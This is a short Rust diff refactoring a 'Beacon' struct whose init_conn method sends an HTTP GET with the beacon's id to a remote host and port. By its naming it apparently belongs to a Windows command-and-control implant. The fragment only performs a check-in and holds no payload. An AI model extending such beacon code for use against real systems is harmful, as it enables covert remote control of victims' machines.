@@ -3,7 +3,7 @@ pub mod client;
 use client::*;
 use log::info;
 use std::time::{SystemTime, UNIX_EPOCH};
-use windows::core::{HSTRING, h};
+use windows::core::HSTRING;
 
 pub struct Beacon {
     pub id: u32,
@@ -21,22 +21,22 @@ impl Beacon {
         Ok(Self { client, id })
     }
 
-    pub fn init_conn(&mut self, hostname: &HSTRING, port: u16) -> windows::core::Result<()> {
+    pub fn init_conn(&mut self, hostname: HSTRING, port: u16) -> windows::core::Result<()> {
         info!("sending initial request to {hostname}:{port}");
         let id_bytes = self.id.to_le_bytes();
 
         let req = Request {
             hostname,
             port,
-            method: h!("GET"),
-            path: h!("/"),
+            method: HSTRING::from("GET"),
+            path: HSTRING::from("/"),
             headers: None,
             body: Some(&id_bytes),
         };
 
-        let resp = self.client.request(&req)?;
-        let status_code = resp.get_status_code()?;
-        info!("status code: {}", status_code);
+        let resp = self.client.request(req)?;
+        info!("status code: {}", resp.status_code);
+
         Ok(())
     }
 }
